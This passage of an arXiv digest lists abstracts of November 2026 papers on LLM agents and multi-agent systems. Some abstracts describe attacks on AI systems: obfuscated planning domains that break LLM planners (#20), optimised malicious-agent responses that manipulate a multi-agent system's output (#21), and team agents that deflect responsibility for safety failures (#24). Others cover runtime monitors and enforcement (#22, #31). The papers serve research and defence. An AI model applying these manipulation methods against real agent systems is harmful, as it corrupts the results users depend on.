control. We organize the design space by multi-agent collaboration, tool integration, memory, and planning, and show how these mechanisms supply the checks and evidence on which a verdict rests. We consolidate published scores and reproduce missing entries for key agentic judges; the comparison reveals uneven agentic gains and motivates dedicated agentic evaluation. We conclude by characterizing application demands and open challenges in cost, reliability, safety, and governance that condition trusted deployment of agentic judges at scale.

</details>


### 14. A$^3$: Adaptive Audio Agent Framework for Collaborative Edge Computing

- **Authors:** Zexin Li, Xueyi Zhang, Tao Ren, Yiming Chen
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18064v1](http://arxiv.org/abs/2611.18064v1)
- **PDF:** [https://arxiv.org/pdf/2611.18064v1](https://arxiv.org/pdf/2611.18064v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Embedded audio agents need a nearby edge server for speed, but a server-dependent agent returns nothing when the link fails. We present A$^3$, an adaptive audio agent framework that places whole pipeline stages on the server, keeps a complete fallback agent on devices that can host one, and hedges both paths with a link-aware deadline that decides when to give up on the server. On Jetson devices and an RTX A4500 server, A$^3$ matches the server-only agent on a healthy link, answers every request in a full outage on the AGX, and beats a percentile hedge in simulated outages.

</details>


### 15. FEND: Far-End Detection in Outbound Voice AI Calls

- **Authors:** Abhishek Kumar, Suraj Agrawal, Aashraya Sachdeva
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.18050v1](http://arxiv.org/abs/2611.18050v1)
- **PDF:** [https://arxiv.org/pdf/2611.18050v1](https://arxiv.org/pdf/2611.18050v1)
- **Categories:** cs.CL, eess.AS


> Summary unavailable.


<details>
<summary>Abstract</summary>

When a conversational Voice AI agent places an outbound call, the far end may be a live person, a voicemail greeting, an interactive voice response (IVR) system, or increasingly another AI system answering on the callee's behalf. Standard Answering Machine Detection (AMD) reports only whether a human or a machine picked up, a design meant for human call centres, where one machine is as uninteresting as another. That single bit does not tell a Voice AI agent what to do, since leaving a voicemail message, navigating an IVR and holding a short exchange with another AI are three different actions and a two-valued label cannot distinguish them. In 1,000 randomly sampled calls from our own outbound deployment, a live person answered 48.1%, a voicemail system 44.6%, an AI 6.9% and an IVR 0.4%. Our proposed framework, FEND, reads the far end's audio and its streaming transcript and runs one detector for each automated class (voicemail, IVR, AI callee), with human the default when nothing fires, returning a single label within 20 seconds. On a public benchmark the voicemail components reach 100% accuracy without ever misclassifying a live human, where Asterisk's AMD misclassifies 30 to 66% of them. For the AI callee, acoustic features do not transfer across recording conditions, but speech timing does, separating AI from human at 0.952 ROC-AUC, because synthesised speech leaves far shorter gaps between words. On production traffic, separating a live person from any automated far end reaches F1 0.979, and only 2.9% of live people are given an automated label, the error that matters most for an agent acting on the result.

</details>


### 16. From Images to Grounded Edits: A Real-World Benchmark for Chinese Grammatical Error Correction in Handwritten Essays

- **Authors:** Weiru Zhang, Yuzhong Hong, Junwei Bao, Lemao Liu, Dejing Dou
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17966v1](http://arxiv.org/abs/2611.17966v1)
- **PDF:** [https://arxiv.org/pdf/2611.17966v1](https://arxiv.org/pdf/2611.17966v1)
- **Categories:** cs.CV, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Chinese Grammatical Error Correction (CGEC) is typically formulated as a text-to-text problem. While suitable for digital texts, this formulation falls short in real-world K-12 education, where AI-assisted corrections are expected directly on essay images, which are primarily handwritten and exhibit many irregularities. To bridge this gap, we introduce Grounded Chinese Grammatical Error Correction (G-CGEC), an image-to-grounded-edit task requiring systems to predict both corrections and their positions on essay images. We propose G-CGEC-Eval, a benchmark comprising real-world images of K-12 Chinese essays with fine-grained annotations. For evaluation, we adapt IoU-based metrics from object detection and propose a more tolerant alternative based on center-distance matching. Using this benchmark, we evaluate open-source and proprietary vision-language models under a direct single-pass setting, as well as settings with auxiliary components (OCR and character grounding) coordinated via pipelining or agentic harnessing. Results show that even top-tier proprietary models perform surprisingly poorly in the single-pass setting, while pipelining and agentic harnessing yield meaningful improvements. Notably, an error-type-based multi-agent workflow achieves the best performance, establishing it as the strongest baseline for future G-CGEC research. Through ablations and fine-grained analysis, we find the task remains far from solved, with linguistic error discovery and character-level grounding as the primary bottlenecks. This underscores the need for models that better integrate visual perception with linguistic reasoning and visual grounding.

</details>


### 17. OutfitterBench: Evaluating LLM Agents on Long-Horizon Resource Allocation and Commitment Coordination

- **Authors:** Jie Huang, Yuecheng Hong, Yao Chen, Shengding Jiao, Xudong Liu, Qiang Ye
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17933v1](http://arxiv.org/abs/2611.17933v1)
- **PDF:** [https://arxiv.org/pdf/2611.17933v1](https://arxiv.org/pdf/2611.17933v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

In many long-horizon settings, an agent's own choices create future constraints: committing finite capacity establishes future obligations and forecloses later opportunities. Sustaining performance therefore requires both keeping evolving plans feasible and comparing the value of resource allocations with the alternatives they displace. Recent benchmarks increasingly evaluate LLM agents in continuing operations, but give less attention to how agents keep their own commitments feasible while reassessing resource allocations as opportunities change. We introduce OutfitterBench, where agents manage an outdoor-equipment rental business for 200 days, purchasing from a 46-product catalog and handling roughly 1,100 reservation requests. Under a fixed capital ceiling, reservations and uncertain walk-in demand compete for reusable equipment whose availability changes over time. Experiments with seven frontier LLMs show that several agents underperform a simple rule-based baseline, while only the leading agent consistently surpasses it. Trajectory analysis shows that some agents apply known constraints inconsistently and make new decisions that conflict with existing commitments. Agents with more reliable fulfillment can still secure low returns from comparable commitments or delay resource reallocation. The leading agent better connects preparation with economic choices but also misses opportunities for more profitable asset use. These findings highlight limitations in sustaining coherent resource plans and reassessing their value over time. The benchmark code is publicly available at https://github.com/adminblackjack/OutfitterBench.

</details>


### 18. MineralExp: Benchmarking LLM Agents for Experimental Design in Real-World Mineral Exploration

- **Authors:** Bing Wang, Mingyang Wang, Yuanhang Mi, Yue Xu, Kaibo Su, Li'ang Xiao, Chunguo Wu, Changchun Li, Ximing Li, Kun-Feng Qiu, Bo Yang
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17931v1](http://arxiv.org/abs/2611.17931v1)
- **PDF:** [https://arxiv.org/pdf/2611.17931v1](https://arxiv.org/pdf/2611.17931v1)
- **Categories:** cs.CL, cs.AI, cs.CE


> Summary unavailable.


<details>
<summary>Abstract</summary>

In mineral exploration, verifying geological hypotheses relies on designing a variety of geochemical experiments. While large language model (LLM) agents increasingly automate downstream geoscientific data analysis, a crucial upstream capability remains largely unexplored: automated geochemical experimental design, i.e., deciding which experiments to conduct before committing to costly laboratory work. Evaluating this capability of LLM agents is difficult for two reasons. First, geochemical experiments exhibit high methodological diversity and subjectivity: to test the same hypothesis, different geologists may choose different minerals and instruments, so no single protocol can serve as the reference answer. Second, open-ended experimental plans resist representation as structured labels, which makes objective scoring difficult. To address these challenges, we introduce MineralExp, a benchmark that reformulates geochemical experimental design as a hypothesis-based experiment selection problem, i.e., a multi-label classification problem. We abstract concrete instrument names and procedural details into a shared taxonomy of 19 experimental types across five mineral-system processes: Source, Transport, Deposition, Modification, and Preservation. This taxonomy yields deterministic multi-label targets while accommodating diverse experimental protocols. Constructed from published ore-deposit literature and verified by domain experts, MineralExp comprises 277 cases and 1,572 reference experimental plans. Given a geological hypothesis and initial context, an LLM agent selects the relevant tasks and generates concrete experimental plans, which are scored by multi-label classification metrics and an LLM-as-a-Judge metric. The experimental results show that current agents generally achieve high recall but low precision, tending to propose more experiments than are necessary to test the hypothesis.

</details>


### 19. When Cooperation Must Change: Semantic Strategy Unlearning in Multi-Agent Reinforcement Learning

- **Authors:** Wenhan Wu, Linghan Chen, Yudong Gao, Fan Yang, Honglong Chen, Kai Yin, Jiawei Jiang, Chuang Hu
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17917v1](http://arxiv.org/abs/2611.17917v1)
- **PDF:** [https://arxiv.org/pdf/2611.17917v1](https://arxiv.org/pdf/2611.17917v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Cooperative multi-agent reinforcement learning (MARL) supports coordinated decision-making in distributed Web services, multi-robot control, and collaborative games through learned coordination conventions. When deployment requirements change, a previously useful convention may become obsolete or unsafe. For example, revised cache-sharing permissions in Web content delivery may require caches to abandon a learned division of storage and serving roles while maintaining efficient delivery. Teams must therefore remove the specified convention while preserving useful cooperation. This is challenging because the same relational pattern can be reproduced by different agents across different histories. Runtime shielding leaves the underlying coordination preference intact and can impair task progress, while existing reinforcement unlearning and trajectory-deletion methods do not directly target role-invariant conventions. This paper formalizes this problem as semantic coordination-strategy unlearning and proposes CARVE.CARVE uses causal coordination attribution to identify influential interactions and retain-aware subspace updates to limit interference with unrelated behaviors. Counterfactual re-coordination helps agents learn productive alternatives, while adversarial auditing tests whether the target convention can still be recovered. Accepted updates are merged into decentralized actors for direct deployment. Evaluation across five cooperative MARL benchmarks shows that CARVE reduces mean nominal convention-completion and worst-case elicitation rates by 91.4\% and 83.3\%, respectively.The median utility loss is 5.9\%, and measured inference latency matches that of the original policies.

</details>


### 20. Adversarially Attacking Symbolic Vocabulary Vulnerabilities In LLM Planners

- **Authors:** Stephen Obadinma, Xiaodan Zhu
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17910v1](http://arxiv.org/abs/2611.17910v1)
- **PDF:** [https://arxiv.org/pdf/2611.17910v1](https://arxiv.org/pdf/2611.17910v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

As large language models (LLMs) are increasingly deployed as autonomous agents, their abilities in navigating automated planning tasks have become essential. However, despite their strengths, LLMs' planning ability is not robust, particularly when they are not allowed to exploit commonsense cues in the symbolic vocabulary (e.g., names of actions, predicates, and objects) used to define planning tasks. This makes LLMs unreliable compared to symbolic planners. With recent reasoning models showing improved planning performance on tasks with obfuscated symbolic vocabularies, we utilize an adversarial attack framework to reveal to what extent the crucial weaknesses of LLM agents at joint symbolic interpretation and planning remain and whether they can reason properly when presented with severe cases. As such, our main contribution is devising an LLM-based attack model, which we call Symbolic Swapper, to automatically generate obfuscated planning domains with non-standard symbolic vocabularies that systematically break strong reasoning models' ability to plan. In doing so, we reveal how much LLMs' planning abilities can be further degraded under more advanced obfuscation schemes, allowing us to ascertain their success when having to rely on their pure planning ability. We find that attacks can decrease the planning performance of base models and even robust planning frameworks by over 70%. We further analyze the factors behind how LLM planning abilities break down and find that successful obfuscation causes models to appear to significantly degrade in reasoning quality despite them showing some inherent ability to understand the domain, revealing a gap in the perception of a task domain and being able to plan under it.

</details>


### 21. Securing Multi-Agent Systems by Design

- **Authors:** Xilong Wang, Xiaoxing Chen, Neil Gong
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17883v1](http://arxiv.org/abs/2611.17883v1)
- **PDF:** [https://arxiv.org/pdf/2611.17883v1](https://arxiv.org/pdf/2611.17883v1)
- **Categories:** cs.CR, cs.AI, cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Multi-agent systems solve complex tasks by decomposing them into subtasks, delegating the subtasks to agents, and aggregating the agents' responses using an aggregation rule. Malicious agents can manipulate the final solution by providing malicious responses to their assigned subtasks. In this paper, we first propose response manipulation attacks (ReMA), which iteratively optimize malicious responses to maximize attack effectiveness. Specifically, we formulate untargeted and targeted attacks as optimization problems and develop an approach to approximately solve these problems by iteratively refining malicious responses based on feedback from a surrogate multi-agent system. To defend against such attacks, we further propose SecMAS, a secure aggregation rule that leverages the semantic similarities among agent responses to select the response that is most consistent with a sufficiently large subset of the other responses. We theoretically establish security guarantees for SecMAS against both untargeted and targeted attacks. Extensive evaluations demonstrate that existing aggregation rules are vulnerable to ReMA, whereas SecMAS effectively defends against all evaluated attacks, including adaptive variants of ReMA, while maintaining utility comparable to that of existing aggregation rules.

</details>


### 22. Soteria: Formally Verified Planning with Runtime Enforcement for Safe LLM Agents

- **Authors:** Mike He, Ankush Desai, Sharad Malik, Aarti Gupta
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17880v1](http://arxiv.org/abs/2611.17880v1)
- **PDF:** [https://arxiv.org/pdf/2611.17880v1](https://arxiv.org/pdf/2611.17880v1)
- **Categories:** cs.AI, cs.SE


> Summary unavailable.


<details>
<summary>Abstract</summary>

LLM agents that execute multi-step tool calls must satisfy two objectives simultaneously: completing the user's task (utility) and conforming to domain policies and correctness constraints (safety). These objectives are in tension -- blocking an unsafe action prevents a violation but can leave the agent stranded with no principled way to recover. Existing approaches sacrifice one objective for the other. We introduce Soteria, a framework that reconciles safety and utility through verified hierarchical planning and runtime enforcement of specifications. Before execution, the agent generates a structured plan that is formally verified against the specifications prior to any tool invocation. During execution, the verified plan serves dual roles: it ensures that the agent takes specification-conformant trajectories and provides guidance when unsafe actions are blocked. Across multiple benchmarks covering a diverse range of tool-use tasks, Soteria achieves 1.7 times the average task success rate of the best baselines, with no violations of policy specifications, demonstrating that safety and utility need not be traded off.

</details>


### 23. SceneAgent: A Multi-Agent Framework for Portable Game Scene Generation

- **Authors:** Xingyi Li, Jiahao Yang, Yiqin Zhu, Jingwen Ye, Yang Sun, Weidong Zhang
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17821v1](http://arxiv.org/abs/2611.17821v1)
- **PDF:** [https://arxiv.org/pdf/2611.17821v1](https://arxiv.org/pdf/2611.17821v1)
- **Categories:** cs.CV, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Moving a scene generator to a new game engine requires more than exporting its final output: planning, construction tools, and stored experience may also depend on the original backend. We present SceneAgent, a multi-agent framework for reusing the construction process and its experience across backends. A canonical SceneContext maintains the evolving world, while backend adapters isolate coordinate conventions, asset bindings, and export. Structured handoffs let fresh Builder sessions query this persistent state without inheriting the full construction transcript. Across generations, human-approved traces are distilled into asset-ID-free Layout skills and semantic Content skills that can be retrieved and recombined. We introduce GameSceneBench, comprising 69 indoor and outdoor prompts. Under a common asset and evaluation protocol, SceneAgent obtains human tie-adjusted preference scores of 78.2-89.4% against five baselines. Ablations show that reusable skills and the multi-agent protocol primarily improve prompt alignment and scene completeness, with additional runtime. Deployment in a second engine preserves the shared construction protocol and skill library while replacing backend integration components. Together, these results support separating persistent scene state, task-local reasoning, and reusable experience for portable scene construction.

</details>


### 24. Aligning AI Teams

- **Authors:** Siddarth Srinivasan, Morgan Jane Matthews, Jascha Sohl-Dickstein, Erik Jones
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17820v1](http://arxiv.org/abs/2611.17820v1)
- **PDF:** [https://arxiv.org/pdf/2611.17820v1](https://arxiv.org/pdf/2611.17820v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Previous work has shown that alignment training on individual LLM agents can fail to transfer to multi-agent settings. We investigate the underlying mechanisms for this failure, and explore interventions to preserve alignment transfer to multi-agent LLM teams. We focus on two software-engineering tasks (sepsis triage, a news recommender) and ten consulting-proposal generation tasks. We present four findings: (1) The single-vs-team safety gap does not show a clear trend with more capable models. We find that Anthropic's Mythos Preview shows the largest gap on one of our tasks but the smallest on another; (2) Many natural interventions, such as having agents critique each other's work or coordinate in a group chat, do not reliably bring agent teams back to single-agent alignment behavior; (3) diffusion of responsibility substantially accounts for the safety gap: agents in teams are less likely to proactively check for system-level safety failures and more likely to ignore, rationalize, or deflect responsibility for issues when they arise; (4) having a designated safety lead agent ensure system-level safety, and having a coordinator agent publish a safety specifications document are effective at restoring single-agent alignment. We also release magelab, a multi-agent LLM orchestration and experimentation framework. Our findings can help practitioners design agent teams that successfully preserve the behaviors expected of aligned individual agents.

</details>


### 25. CarryOn: Learning What to Keep in Context for Long-Horizon LLM Agents

- **Authors:** Lihuan Li, Ruiyi Yang, Jiru Wang, Yifan Duan, Xiachong Lin, Hao Xue, Yang Song, Flora Salim
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17808v1](http://arxiv.org/abs/2611.17808v1)
- **PDF:** [https://arxiv.org/pdf/2611.17808v1](https://arxiv.org/pdf/2611.17808v1)
- **Categories:** cs.CL, cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

Long-horizon LLM agents can coordinate tools and applications to complete complex, multi-step tasks. As their interaction histories grow, effective context management becomes essential for reliable and efficient execution. Existing methods reduce context through summarization, pruning, or history selection. However, shorter contexts do not necessarily support better decisions: summaries can omit exact details needed for later actions, while retaining entire interactions can carry substantial irrelevant information. We propose CarryOn, a lightweight context manager that pairs compact execution state with fine-grained, source-linked evidence. A learned selector and adaptive retention policy keep relevant evidence available without additional LLM calls for context management. We introduce two complementary evaluation metrics: $S_α$ prioritizes task success while accounting for resource use, and normalized cost per success (NCS) measures the resources spent per successful task. Across AppWorld, OfficeBench, and Tau2 Telecom with three LLM Actors, CarryOn achieves 75.7% macro-averaged task success, exceeding the strongest baseline by 6.7 percentage points. It also achieves the best average scores on both metrics.

</details>


### 26. Vision-as-a-Tool: Visual Harness for Multimodal Agentic Coding

- **Authors:** Haolin Yang, Wenshan Wu, Jin Jiang, Yu Cheng, Yan Xia, Ting Song, Yangyu Huang, Zhiliang Peng, Wenhui Wang, Hangbo Bao, Yuzhe Zhang, Wen-Da Wei, Tengchao Lv, Li Dong, Lei Cui, Furu Wei
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17797v1](http://arxiv.org/abs/2611.17797v1)
- **PDF:** [https://arxiv.org/pdf/2611.17797v1](https://arxiv.org/pdf/2611.17797v1)
- **Categories:** cs.AI, cs.CV


> Summary unavailable.


<details>
<summary>Abstract</summary>

Multimodal agentic coding requires robust visual reasoning to analyze observations and evaluate generated artifacts. Current frameworks largely rely on a Thinking-with-Images paradigm, where agents depend on their intrinsic vision to execute visually grounded tasks. However, this architectural coupling introduces a fundamental bottleneck. Agent performance remains strictly bounded by internal perceptual limitations. Furthermore, text-only agents lack native perception. Without specialized tools, they cannot perform visual reasoning. To overcome these constraints, we introduce the Vision-as-a-Tool (VaaT) paradigm. Prior visual tool-use merely manipulates images for an agent's intrinsic vision to read. In contrast, VaaT reframes general-purpose multimodal large language models (MLLMs) as callable external utilities. As a result, text-only agents can completely offload visual reasoning during agentic execution. Meanwhile, vision-capable agents can dynamically augment their native perception on demand. We instantiate this paradigm in VHarness, a unified framework driven by five atomic actions. We comprehensively evaluate VHarness across Image-to-HTML, Image-to-SVG, and Image-to-3D generation tasks. Experimental results demonstrate that VHarness consistently improves visual fidelity and geometric accuracy across both text-only and multimodal coding agents. These findings highlight that modularizing visual reasoning into callable utilities provides a flexible and scalable foundation for future agentic coding systems.

</details>


### 27. MASTARS: Multi-Agent Sequential Trajectory Augmentation with Return-Conditioned Subgoals

- **Authors:** Jiwon Jeon, Myungsik Cho, Woojun Kim, Seongmin Kim, Woohyeon Byeon, Seungyul Han, Youngchul Sung
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17793v1](http://arxiv.org/abs/2611.17793v1)
- **PDF:** [https://arxiv.org/pdf/2611.17793v1](https://arxiv.org/pdf/2611.17793v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

The performance of offline Multi-Agent Reinforcement Learning (MARL) is limited by the quality of the fixed offline dataset, motivating trajectory augmentation. However, augmenting multi-agent trajectories presents a fundamental challenge of the diversity-coordination trade-off: independent generation improves diversity but lacks coordination, while joint generation induces coordination but lacks diversity, reproducing the training distribution. To address this challenge in multi-agent data augmentation, we introduce MASTARS, a novel diffusion-based framework that generates multi-agent trajectories sequentially across agents while enforcing cross-agent consistent coordination via the method of inpainting. MASTARS produces trajectories that are diverse, coordinated and globally coherent. Experiments on various benchmarks such as MPE, SMAC, and SMAC-v2 demonstrate significant performance gains across multiple offline MARL methods.

</details>


### 28. AutoRL: A Multi-Agent System towards Autonomous Reinforcement Learning

- **Authors:** Simon Tang, Wenjie Shi, Yongjing Yin, Keheng Wang, Jialin Liu, Zheng Zhang, Linvo Lin, Xiangyuan Xue, Kan Ren, Jingang Wang, Xunliang Cai
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17790v1](http://arxiv.org/abs/2611.17790v1)
- **PDF:** [https://arxiv.org/pdf/2611.17790v1](https://arxiv.org/pdf/2611.17790v1)
- **Categories:** cs.AI, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Recursive self-improvement (RSI) is one of the most promising paths toward an AI singularity for superintelligence. Achieving this vision requires AI systems to undertake the full training pipeline for iterative improvement. Reinforcement learning (RL) plays an essential role in this cycle to improve model capabilities and generalization, yet automating RL remains difficult due to unstable training dynamics and the need for sustained supervision. We introduce AutoRL, a multi-agent system for automating RL training, as a cornerstone for future RSI. Different from conducting research by end-to-end complete experiments, AutoRL monitors the evolving training state and integrates process-level supervision and research into an ongoing RL training, following the practical workflow of an RL researcher. Specifically, AutoRL consists of three RL-specific agentic roles. Perceptors track training dynamics, rollouts, evaluation, and efficiency, triggering deliberation when they detect anomalies, degradation, or stagnation. Three complementary Proposers diagnose problems and refine candidate interventions through shared evidence and checks. The Orchestrator reviews their recommendation and applies approved changes through online hot updates or checkpoint-based resumption. Experiments on Qwen3 and LongCat-Flash-Lite demonstrate the superiority of AutoRL over static RL recipes and a general agent. The research records show that existing agents can handle unattended RL supervision and dynamic adjustment. The difficulty for future RSI lies in developing fundamental methods that are valuable for resource-consuming validation.

</details>


### 29. LuthorSQL: A One-Pass Text-to-SQL Model as System 1 for a Slower LLM Agent

- **Authors:** Ibrahim Memon, Armin Karamzade, M. Hanif Jhaveri, Roy Fox
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17780v1](http://arxiv.org/abs/2611.17780v1)
- **PDF:** [https://arxiv.org/pdf/2611.17780v1](https://arxiv.org/pdf/2611.17780v1)
- **Categories:** cs.CL, cs.AI, cs.DB, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Frontier LLM agents that query databases with tools are among the most accurate text-to-SQL systems, but per-query calls to a hosted model are slow, costly, and expose sensitive organizational queries to external APIs. For example, a Claude Opus 5.5 agent serving 10,000 queries a day costs over $70,000 a year at list price. To what extent can local hardware already owned by an organization offload this burden without compromising the agent's accuracy? We present LuthorSQL, a non-autoregressive 7B text-to-SQL model that serves as a rapid System 1 gate for a slower LLM agent (System 2), escalating queries only when uncertain. LuthorSQL makes a single forward pass to predict slot scores over a bounded grammar for query plans, compiles and runs up to 32 candidate plans, and chooses an answer using a trained validator. On its own, LuthorSQL reaches 68.03% execution accuracy on BIRD's hidden test set at 0.84 s per question on a single GPU, maintains its accuracy in 9 GB with 8-bit quantized weights, and transfers zero-shot to Snowflake, BigQuery, MySQL, PostgreSQL, and DuckDB within 3.1 points of its native SQLite accuracy. Combined with Claude Opus 5.5 in a pre-registered confidence cascade over 227 questions on databases published after Opus's training cutoff, LuthorSQL answers nearly half of all questions locally and cuts API cost by 33.3% at the same accuracy. Finally, contamination probing shows that Opus reproduces 48-92% of public benchmark gold queries verbatim without seeing the schema; however, its tool-assisted accuracy holds on renamed schemas and reaches 95.6-97.4% on post-cutoff databases. Code and data: https://github.com/IAMIbrahimmemon/luthorsql

</details>


### 30. Creative Product Design under Brand Image Constraints

- **Authors:** Takeshi Onishi, Hiroya Makino, Takahiro Yamaguchi, Hiroyuki Sakai
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17762v1](http://arxiv.org/abs/2611.17762v1)
- **PDF:** [https://arxiv.org/pdf/2611.17762v1](https://arxiv.org/pdf/2611.17762v1)
- **Categories:** cs.CV, cs.AI, cs.GR


> Summary unavailable.


<details>
<summary>Abstract</summary>

Industrial design requires creative visual exploration while satisfying constraints that are often product-specific and implicit. Existing text-to-image (T2I) approaches can generate creative designs through concept blending or multi-agent self-enhancement, but they provide limited mechanisms for ensuring that generated designs remain consistent with such constraints. We focus on brand image as a representative design constraint and propose a framework for brand-aware redesign generation. Given a product name, the framework constructs a brand image survey report that summarizes product and market information, derives a creative direction from the report, and integrates this direction into a self-enhancement loop in which generated images are critiqued and prompts are revised. We evaluate the framework on 50 redesign tasks across five product categories, comparing it with Naive T2I, IP-Adapter/IT-Blender, and unconstrained self-enhancement under the same T2I backbone. By a VLM-as-Judge protocol to measure creativity and brand identifiability, the proposed framework achieves a more favorable trade-off between the two objectives, with particularly clear gains in highly constrained categories such as automotive and motorcycle, where the plausible design space is relatively limited compared with that of other product categories. These results suggest that dynamically eliciting and textualizing brand image can guide creative product design generation under brand image constraints.

</details>


### 31. Learn then Bet: Learning Interpretable Rules for Reliable Agent Intervention

- **Authors:** You-Lin Chen, Xinyi Lisa Chen, Pedro Herrero-Vidal, Xiaojing Yu, Bingqing Song, Bin Xu
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17662v1](http://arxiv.org/abs/2611.17662v1)
- **PDF:** [https://arxiv.org/pdf/2611.17662v1](https://arxiv.org/pdf/2611.17662v1)
- **Categories:** cs.AI, cs.LG


> Summary unavailable.


<details>
<summary>Abstract</summary>

Autonomous agents now run for hundreds of steps with little or no human supervision. In practice, practitioners use runtime monitors such as turn limits and keyword filters to decide when a run should be stopped, upgraded, or assisted. However, these heuristics may stop runs that would otherwise succeed or allow failing runs to continue. To address this limitation, we introduce LeBet (Learn then Bet), a statistical learning framework that derives its learning objective from sufficient conditions for valid and powerful intervention. In particular, LeBet learns an interpretable OR-of-AND monitor and accumulates evidence through a fixed betting statistic, intervening when the evidence reaches a prescribed threshold. Under finite within-class exchangeability and leave-one-out stability, we derive finite-sample guarantees for false-positive control (validity) and detection power conditional on the training data, using the same trajectories for learning and calibration without assuming independent and identically distributed trajectories. To address the intractable combinatorial optimization problem in our learning formulation, we use stochastic local search that leverages the monitor's Boolean structure to propose rule edits aimed at improving empirical separation. On SWE-bench Lite with Ministral 3 8B, the learned monitor saves $34.46\%$ of input-plus-output tokens and increases output precision from $18.33\%$ to $21.59\%$. The empirical false-positive rate is $13.64\%$. Our results show how to formalize the learning problem over interpretable rule sets with statistical conditions and establish training-conditional guarantees for reliable intervention based on partial histories.

</details>


### 32. What LLM Agents See and What Users Say

- **Authors:** Yue Zhao, Angela Huyue Zhang, S. Alex Yang, Hua Wei, Xiyang Hu
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17639v1](http://arxiv.org/abs/2611.17639v1)
- **PDF:** [https://arxiv.org/pdf/2611.17639v1](https://arxiv.org/pdf/2611.17639v1)
- **Categories:** cs.AI, cs.CL


> Summary unavailable.


<details>
<summary>Abstract</summary>

Before an LLM agent cancels a reservation or deletes a folder for a user, what stops it from acting on a false assumption: what its tools show, or what the user says? In this work, we study this gap with presupposition theory from linguistics: an agent may act only if each claim behind the act (e.g., one reservation fits the name) is seen to hold, answered by the user, or disclosed while the act can be undone. A simple bound shows that when lookups cannot tell one record from two, any agent acts without asking first as often with two records as with one. We then vary whether a search lists, counts, or omits a second match, and whether the user states a claim that a record refutes (e.g., "It is empty"). Under a role-only prompt, a count of a second record leaves most of 36 earlier agents acting on the one they see, whereas listing both stops most. When the user says a record such as a folder is empty, however, a count of its one item stops agents about as often as a listing, and stating the claim mostly cuts acting when it is false. The newest Claude and GPT models always open a counted second record, then never act. When we add a same-name, same-zip customer to a retail benchmark, a lookup returning that customer first led to wrong-account writes in about a quarter of conversations, and one that checks a street the user knows kept completion near the one-customer level. Safe writes therefore need lookups that list or check competing records, and evaluations that vary what tools show.

</details>


### 33. More Agents, More Samples, or More Thinking? Untangling Coordination, Ensembling, and Test-Time Compute in Multi-Agent LLMs

- **Authors:** Seyed Mahmoud Sajjadi Mohammadabadi
- **Published:** 2026-11-13
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17610v1](http://arxiv.org/abs/2611.17610v1)
- **PDF:** [https://arxiv.org/pdf/2611.17610v1](https://arxiv.org/pdf/2611.17610v1)
- **Categories:** cs.AI, cs.CL, cs.LG, cs.MA


> Summary unavailable.


<details>
<summary>Abstract</summary>

Evaluations of multi-agent language models often compare communicating architectures against a single greedy pass. This practice confounds coordination with sample multiplicity and inference compute. We synthesize nine primary empirical evaluations comprising 516 unique multi-agent configurations organized along a resource vector R with six dimensions and a baseline ladder with four categories. Against baselines with a single pass (Category A), multi-agent accuracy differences are negative overall and near zero when omitting the largest contributing study. When evaluated against baselines matched on sample count (Category B) or resource budget (Category C), multi-agent systems average -0.042 in accuracy, and multilevel random effects modeling on the log odds scale remains negative across sensitivity checks. Multi-agent accuracy equals or falls below the baseline in 74% of these comparable contrasts, and study means are nonpositive in almost all evaluated studies. Across studies reporting both baselines, moving from a greedy pass to a sampled baseline shifts accuracy differences by -0.038 on average. Because communication adds no information when agents share identical evidence, positive returns require partitioned evidence, external verification, or error diversity across models. We provide a reviewer checklist and accounting utilities.

</details>


### 34. Verifiable pXRD: Hill-climbing pXRD structure determination with LLM agents

- **Authors:** Samuel Chen, Jiaru Bai, Austin Henry Cheng, Varinia Bernales, Alán Aspuru-Guzik
- **Published:** 2026-11-12
- **Source:** arxiv
- **URL:** [http://arxiv.org/abs/2611.17539v1](http://arxiv.org/abs/2611.17539v1)
- **PDF:** [https://arxiv.org/pdf/2611.17539v1](https://arxiv.org/pdf/2611.17539v1)
- **Categories:** cs.AI


> Summary unavailable.


<details>
<summary>Abstract</summary>

